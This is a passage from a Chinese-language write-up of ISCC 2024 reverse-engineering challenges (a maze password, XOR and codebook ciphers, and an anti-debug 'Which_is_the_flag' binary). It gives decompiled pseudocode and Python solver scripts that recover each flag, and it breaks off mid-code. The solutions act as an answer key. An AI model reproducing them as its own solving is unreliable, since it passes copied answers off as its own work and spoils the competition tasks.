<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">  qmemcpy(</span><br><span class="hljs-code">    v11,</span><br>&quot;<span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*P00*0000*</span><span class="hljs-strong">*0*0*0*</span><span class="hljs-strong">*0*</span><span class="hljs-strong">*0*000*00*</span><span class="hljs-strong">*0*</span><span class="hljs-strong">*****</span>0<span class="hljs-strong">**000*0000**</span><span class="hljs-strong">**0*0**</span>0<span class="hljs-strong">**00000*00**</span>0<span class="hljs-strong">*****</span><span class="hljs-strong">*0*</span><span class="hljs-strong">*****</span><span class="hljs-strong">***K*</span>&quot;,<br>sizeof(v11));<br></code></pre></td></tr></table></figure>

<p>发现长度为 100，转换为 10*10 地图发现是迷宫</p>
<p><img src="../../../../img/archives/2024ISCC05/8cc2c3be5d4efd1c9b87d8138111c74f.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">0</span>,<span class="hljs-number">10</span>):<br>    <span class="hljs-attribute">print</span>(mg[<span class="hljs-number">10</span>*i:<span class="hljs-number">10</span>*(i+<span class="hljs-number">1</span>)])<br></code></pre></td></tr></table></figure>

<p>尝试后发现 P 是起点 K 是终点，且有两条路通往终点，其中 ddssddwwdddssssssss 这条是密码</p>
<p><img src="../../../../img/archives/2024ISCC05/e30a902eb7f8d1130e8ffaf90970b261.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/83051c5251d75ae883d1d004f5a301ce.png" srcset="/img/loading.gif" lazyload> 解压出来是一串 16 进制的图片，应该是机器码</p>
<p>call 了函数 sub_401410 进行加密，密文在 sub_4015F0</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs smali">char __cdecl sub_401410(int a1)<br>&#123;<br> <span class="hljs-built_in"> int </span>v1; // ebx<br> <span class="hljs-built_in"> int </span>v2; // ebx<br> <span class="hljs-built_in"> int </span>v3; // ebx<br> <span class="hljs-built_in"> int </span>v4; // ebx<br> <span class="hljs-built_in"> int </span>v5; // ebx<br> <span class="hljs-built_in"> int </span>v6; // ebx<br>  _DWORD v8[10]; // [esp-18h] [ebp-70h] BYREF<br>  char v9; // [esp+11h] [ebp-47h]<br>  char v10; // [esp+12h] [ebp-46h]<br>  char v11; // [esp+13h] [ebp-45h]<br>  unsigned<span class="hljs-built_in"> int </span>i; // [esp+14h] [ebp-44h]<br>  char v13[24]; // [esp+18h] [ebp-40h] BYREF<br>  char v14[24]; // [esp+30h] [ebp-28h] BYREF<br> <span class="hljs-built_in"> int </span>v15; // [esp+54h] [ebp-4h]<br><br>  v15 = 1;<br>  sub_401D80(&amp;unk_404200);<br>  v11 = 0;<br> <span class="hljs-built_in"> if </span>( unknown_libname_3(&amp;a1) == 24 )<br>  &#123;<br>    sub_401E60(&amp;a1);<br>    LOBYTE(v15) = 2;<br>    for ( i = 0; i &lt; unknown_libname_3(&amp;a1) - 1; i += 4 )<br>    &#123;<br>      v1 = *(char *)sub_401D20(i);<br>      v2 = *(char *)sub_401D20(i + 1) ^ v1;<br>      *(_BYTE *)sub_401D20(i) = v2;<br>     <span class="hljs-built_in"> if </span>( i + 2 &lt; unknown_libname_3(&amp;a1) )<br>      &#123;<br>        v3 = *(char *)sub_401D20(i + 1);<br>        v4 = *(char *)sub_401D20(i + 2) ^ v3;<br>        *(_BYTE *)sub_401D20(i + 1) = v4;<br>      &#125;<br>     <span class="hljs-built_in"> if </span>( i + 3 &lt; unknown_libname_3(&amp;a1) )<br>      &#123;<br>        v5 = *(char *)sub_401D20(i + 2);<br>        v6 = *(char *)sub_401D20(i + 3) ^ v5;<br>        *(_BYTE *)sub_401D20(i + 2) = v6;<br>      &#125;<br>    &#125;<br>    v8[9] = v8;<br>    sub_401E60(v14);<br>    v10 = sub_4015F0(v8[0], v8[1]);<br>    v11 = v10;<br>    v9 = v10;<br>    LOBYTE(v15) = 1;<br>    std::string::~string(v14);<br>    LOBYTE(v15) = 0;<br>    std::string::~string(v13);<br>    v15 = -1;<br>    std::string::~string(&amp;a1);<br>   <span class="hljs-built_in"> return </span>v9;<br>  &#125;<br>  else<br>  &#123;<br>    LOBYTE(v15) = 0;<br>    std::string::~string(v13);<br>    v15 = -1;<br>   <span class="hljs-built_in"> return </span>std::string::~string(&amp;a1);<br>  &#125;<br>&#125;<br>char __cdecl sub_4015F0(int a1)<br>&#123;<br> <span class="hljs-built_in"> int </span>*i; // [esp+10h] [ebp-90h]<br>  char v3[24]; // [esp+18h] [ebp-88h] BYREF<br> <span class="hljs-built_in"> int </span>v4[24]; // [esp+30h] [ebp-70h] BYREF<br> <span class="hljs-built_in"> int </span>v5; // [esp+90h] [ebp-10h] BYREF<br> <span class="hljs-built_in"> int </span>v6; // [esp+9Ch] [ebp-4h]<br><br>  v6 = 1;<br>  v4[0] = 26;<br>  v4[1] = 16;<br>  v4[2] = 0;<br>  v4[3] = 67;<br>  v4[4] = 12;<br>  v4[5] = 55;<br>  v4[6] = 35;<br>  v4[7] = 99;<br>  v4[8] = 127;<br>  v4[9] = 126;<br>  v4[10] = 35;<br>  v4[11] = 98;<br>  v4[12] = 91;<br>  v4[13] = 126;<br>  v4[14] = 16;<br>  v4[15] = 81;<br>  v4[16] = 55;<br>  v4[17] = 72;<br>  v4[18] = 124;<br>  v4[19] = 67;<br>  v4[20] = 97;<br>  v4[21] = 97;<br>  v4[22] = 92;<br>  v4[23] = 125;<br>  sub_401D80(&amp;unk_404201);<br>  for ( i = v4; i != &amp;v5; ++i )<br>    std::string::operator+=(*i);<br> <span class="hljs-built_in"> if </span>( (unsigned __int8)sub_4027E0(&amp;a1, v3) )<br>  &#123;<br>    LOBYTE(v6) = 0;<br>    std::string::~string(v3);<br>    v6 = -1;<br>    std::string::~string(&amp;a1);<br>   <span class="hljs-built_in"> return </span>1;<br>  &#125;<br>  else<br>  &#123;<br>    LOBYTE(v6) = 0;<br>    std::string::~string(v3);<br>    v6 = -1;<br>    std::string::~string(&amp;a1);<br>   <span class="hljs-built_in"> return </span>0;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="../../../../img/archives/2024ISCC05/c6baea95731924a61d26527a00e1e721.png" srcset="/img/loading.gif" lazyload> Sub_401410 中函数循环遍历 a1 的内容，每 4 个字节进行一次循环。在循环中，函数使用异或操作对 a1 中的每个字节进行解密。调用 sub_4015F0(v8 [0], v8 [1]) 进行进一步的解密操作，并将结果存储到 v10 中。最后，函数将 v9 赋值为 v10，并返回 v9。Sub_4015F0 中将预定义的密钥数组 v4 的值赋值给 v4 数组。循环遍历 v4 数组，将每个元素拼接成一个字符串， 对 a1 进行解密，并将解密后的结果存储到 v3 中。如果解密成功，则返回 1，否则返回 0。据此编写 exp 进行解密</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br>c=<span class="hljs-string">&quot;&quot;&quot;  v4[0] = 26;</span><br><span class="hljs-string">  v4[1] = 16;</span><br><span class="hljs-string">  v4[2] = 0;</span><br><span class="hljs-string">  v4[3] = 67;</span><br><span class="hljs-string">  v4[4] = 12;</span><br><span class="hljs-string">  v4[5] = 55;</span><br><span class="hljs-string">  v4[6] = 35;</span><br><span class="hljs-string">  v4[7] = 99;</span><br><span class="hljs-string">  v4[8] = 127;</span><br><span class="hljs-string">  v4[9] = 126;</span><br><span class="hljs-string">  v4[10] = 35;</span><br><span class="hljs-string">  v4[11] = 98;</span><br><span class="hljs-string">  v4[12] = 91;</span><br><span class="hljs-string">  v4[13] = 126;</span><br><span class="hljs-string">  v4[14] = 16;</span><br><span class="hljs-string">  v4[15] = 81;</span><br><span class="hljs-string">  v4[16] = 55;</span><br><span class="hljs-string">  v4[17] = 72;</span><br><span class="hljs-string">  v4[18] = 124;</span><br><span class="hljs-string">  v4[19] = 67;</span><br><span class="hljs-string">  v4[20] = 97;</span><br><span class="hljs-string">  v4[21] = 97;</span><br><span class="hljs-string">  v4[22] = 92;</span><br><span class="hljs-string">  v4[23] = 125;&quot;&quot;&quot;</span><br>m=<span class="hljs-string">&quot;&quot;</span><br>c=re.findall(<span class="hljs-string">r&#x27;= (\d+);&#x27;</span>,c)<br>c=<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,c))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">24</span>,<span class="hljs-number">4</span>):<br>    c[i+<span class="hljs-number">2</span>]^=c[i+<span class="hljs-number">3</span>]<br>    c[i+<span class="hljs-number">1</span>]^=c[i+<span class="hljs-number">2</span>]<br>    c[i]^=c[i+<span class="hljs-number">1</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">24</span>):<br>    m+=<span class="hljs-built_in">chr</span>(c[i])<br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure>

<p><img src="../../../../img/archives/2024ISCC05/b4b23f26c41d4e8e5485e6f690444565.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="Reverse-I-am-the-Mathematician"><a href="#Reverse-I-am-the-Mathematician" class="headerlink" title="Reverse I_am_the_Mathematician"></a>Reverse I_am_the_Mathematician</h4><p><img src="../../../../img/archives/2024ISCC05/1d9be07aa9098effd19621513b1aa4c4.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/d2efcd764705d97fb4633e1369433cb4.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/99712aa949f8fbe803d1db5b600b025e.png" srcset="/img/loading.gif" lazyload> IDA 反编译上来一串二进制，转字符串发现提示斐波那契，将斐波那契的前 18 个数字作为索引对 code book 进行解密得到 flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fib</span>(<span class="hljs-params">n</span>):<br>  a, b = <span class="hljs-number">0</span>, <span class="hljs-number">1</span><br>  <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    <span class="hljs-keyword">yield</span> b<br>    a, b = b, a + b<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code_book_39.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>  text = f.read()<br><br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i, val <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(fib(<span class="hljs-number">20</span>)):<br>  <span class="hljs-keyword">if</span> val &lt;= <span class="hljs-built_in">len</span>(text):<br>    result += text[val - <span class="hljs-number">1</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ISCC&#123;&#123;<span class="hljs-subst">&#123;result&#125;</span>&#125;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure>

<h4 id="Reverse-WinterBegins"><a href="#Reverse-WinterBegins" class="headerlink" title="Reverse WinterBegins"></a>Reverse WinterBegins</h4><p>IDA 反编译发现有两段加密</p>
<p><img src="../../../../img/archives/2024ISCC05/575270d90122594374ce02433630ccb6.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/a41a0f5acc51349e0aa4720268b5a083.png" srcset="/img/loading.gif" lazyload> 在 v3 断点动调得到 v6，然后根据逻辑进行解密</p>
<p><img src="../../../../img/archives/2024ISCC05/308a5aaa5244334186a6d4c841ffecb4.png" srcset="/img/loading.gif" lazyload> 得到 flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;花墨村前花墨写懒花墨白月村前看醉诗新花墨白月花墨温时花墨诗新看醉看醉看醉白月花墨白月村前看醉花墨村前看醉看醉花墨诗新看醉花墨花墨看醉花墨白月村前看醉花墨村前看醉笔冻花墨酒美花墨疑恍村前温时温时村前花墨写懒炉寒炉寒酒美炉寒温时疑恍酒美&quot;</span><br>l = [s[i*<span class="hljs-number">4</span>:i*<span class="hljs-number">4</span>+<span class="hljs-number">4</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(s) / <span class="hljs-number">4</span>))]<br>l.reverse()<br>enc = <span class="hljs-string">&#x27;&#x27;</span>.join(i[::-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> l)<br><br>table = <span class="hljs-string">&quot;冻笔新诗懒写寒炉美酒时温醉看墨花月白恍疑雪满前村&quot;</span><br>table_map = &#123;table[i:i+<span class="hljs-number">2</span>]: i//<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(table), <span class="hljs-number">2</span>)&#125;<br><br>idx_list = [table_map[enc[i:i+<span class="hljs-number">2</span>]] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(enc), <span class="hljs-number">2</span>)]<br><br>char_list = []<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(idx_list):<br>    <span class="hljs-keyword">if</span> idx_list[i] == <span class="hljs-number">11</span>:<br>        char_list.append(<span class="hljs-built_in">chr</span>(<span class="hljs-number">61</span> + idx_list[i+<span class="hljs-number">1</span>]))<br>        i += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">else</span>:<br>        char_list.append(<span class="hljs-built_in">chr</span>(idx_list[i] + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;0&#x27;</span>)))<br>        i += <span class="hljs-number">1</span><br><br>flag = <span class="hljs-string">&#x27;&#x27;</span>.join(char_list)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(flag).decode())<br></code></pre></td></tr></table></figure>

<h4 id="Reverse-Which-is-the-flag"><a href="#Reverse-Which-is-the-flag" class="headerlink" title="Reverse Which_is_the_flag"></a>Reverse Which_is_the_flag</h4><p>IDA 反编译看伪代码，查看 main 之后跟到 which_is_the_flag 函数继续分析</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  __int64 v4; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// ebx</span><br>  __int64 v6; <span class="hljs-comment">// rax</span><br>  __int64 v7; <span class="hljs-comment">// rax</span><br>  __int64 v8; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">char</span> v10[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+28h] [rbp-58h] BYREF</span><br>  <span class="hljs-type">char</span> v11[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-50h] BYREF</span><br>  __int64 v12; <span class="hljs-comment">// [rsp+58h] [rbp-28h] BYREF</span><br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">tm</span> Tm; <span class="hljs-comment">// [rsp+60h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">int</span> v14; <span class="hljs-comment">// [rsp+88h] [rbp+8h] BYREF</span><br>  <span class="hljs-type">int</span> v15; <span class="hljs-comment">// [rsp+8Ch] [rbp+Ch] BYREF</span><br>  <span class="hljs-type">char</span> Str[<span class="hljs-number">272</span>]; <span class="hljs-comment">// [rsp+90h] [rbp+10h] BYREF</span><br>  <span class="hljs-type">char</span> v17[<span class="hljs-number">47</span>]; <span class="hljs-comment">// [rsp+1A0h] [rbp+120h] BYREF</span><br>  <span class="hljs-type">char</span> v18; <span class="hljs-comment">// [rsp+1CFh] [rbp+14Fh] BYREF</span><br>  <span class="hljs-type">char</span> *v19; <span class="hljs-comment">// [rsp+1D0h] [rbp+150h]</span><br>  <span class="hljs-type">char</span> v20; <span class="hljs-comment">// [rsp+1DFh] [rbp+15Fh]</span><br><br>  _main(argc, argv, envp);<br>  <span class="hljs-built_in">TerminateIfDebuggerPresent</span>();<br>  v3 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="hljs-string">&quot;Which is the flag?&quot;</span>);<br>  std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v3, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);<br>  std::istream::<span class="hljs-built_in">getline</span>(refptr__ZSt3cin, Str, <span class="hljs-number">260</span>i64);<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(Str) &lt;= <span class="hljs-number">0x18</span> )<br>  &#123;<br>    *(_QWORD *)&amp;Tm.tm_sec = <span class="hljs-number">0x800000009</span>i64;<br>    *(_QWORD *)&amp;Tm.tm_hour = <span class="hljs-number">0x10000000C</span>i64;<br>    *(_QWORD *)&amp;Tm.tm_mon = <span class="hljs-number">0x7C00000002</span>i64;<br>    *(_QWORD *)&amp;Tm.tm_wday = <span class="hljs-number">-1</span>i64;<br>    Tm.tm_isdst = <span class="hljs-number">0</span>;<br>    v12 = <span class="hljs-built_in">mktime</span>(&amp;Tm);<br>    <span class="hljs-keyword">if</span> ( v12 == <span class="hljs-number">-1</span> )<br>    &#123;<br>      v6 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="hljs-string">&quot;Failed to generate simulated time!&quot;</span>);<br>      std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v6, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);<br>      <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">encrypt</span>(Str, &amp;v15, &amp;v14, &amp;v12);<br>      v20 = <span class="hljs-number">0</span>;<br>      v19 = &amp;v18;<br>      std::string::basic_string&lt;std::allocator&lt;<span class="hljs-type">char</span>&gt;&gt;(v17, Str, &amp;v18);<br>      <span class="hljs-built_in">GenerateMD5</span>(v11, v17);<br>      std::string::~<span class="hljs-built_in">string</span>(v17);<br>      std::__new_allocator&lt;<span class="hljs-type">char</span>&gt;::~__new_allocator(&amp;v18);<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)std::<span class="hljs-keyword">operator</span>==&lt;<span class="hljs-type">char</span>&gt;(v11, <span class="hljs-string">&quot;61ceb811ff400fad5e464ab8fb920a9a&quot;</span>) )<br>      &#123;<br>        v7 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="hljs-string">&quot;right!&quot;</span>);<br>        std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v7, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);<br>        v20 = <span class="hljs-number">1</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v8 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="hljs-string">&quot;error!&quot;</span>);<br>        std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v8, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v20 )<br>      &#123;<br>        std::thread::<span class="hljs-built_in">thread</span>&lt;<span class="hljs-built_in">void</span> (&amp;)(<span class="hljs-type">int</span>,<span class="hljs-type">int</span>),<span class="hljs-type">int</span> &amp;,<span class="hljs-type">int</span> &amp;,<span class="hljs-type">void</span>&gt;(v10, which_is_flag, &amp;v15, &amp;v14);<br>        std::thread::<span class="hljs-built_in">join</span>((std::thread *)v10);<br>        std::thread::~<span class="hljs-built_in">thread</span>((std::thread *)v10);<br>      &#125;<br>      <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>      v5 = <span class="hljs-number">0</span>;<br>      std::string::~<span class="hljs-built_in">string</span>(v11);<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v4 = std::<span class="hljs-keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="hljs-type">char</span>&gt;&gt;(refptr__ZSt4cout, <span class="hljs-string">&quot;Flag is too long&quot;</span>);<br>    std::ostream::<span class="hljs-keyword">operator</span>&lt;&lt;(v4, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v5;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="../../../../img/archives/2024ISCC05/a3492cce080d91f41f7aebcda1ba5606.png" srcset="/img/loading.gif" lazyload> 在 which_is_the_flag 函数中可以看出函数将将 v305 数组中对应位置的字符与 a2 进行异或操作。IDA 调试后发现 a2 为 0xC，异或回来再解密 base64 得到 flag</p>
<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sas">for ( i = 0; i &lt;= 99; ++i )<br>&#123;<br>  strcpy(<span class="hljs-variable">&amp;v306</span>[65 <span class="hljs-comment">* i], Source[i]);</span><br>  strcpy(<span class="hljs-variable">&amp;v305</span>[65 <span class="hljs-comment">* i + 6512], v406[i]);</span><br>  strcpy(<span class="hljs-variable">&amp;v305</span>[65 <span class="hljs-comment">* i], v408[i]);</span><br>&#125;<br>for ( j = 0; j &lt;= 99; ++j )<br>&#123;<br>  for ( k = 0; k &lt; strle<span class="hljs-meta">n</span>(<span class="hljs-variable">&amp;v306</span>[65 <span class="hljs-comment">* j]);</span> ++k )<br>    v305[65 <span class="hljs-comment">* j + 13024 + k] ^= a2;</span><br>&#125;<br>for ( m = 0; m &lt;= 99; ++m )<br>&#123;<br>  for ( n = 0; n &lt; strle<span class="hljs-meta">n</span>(<span 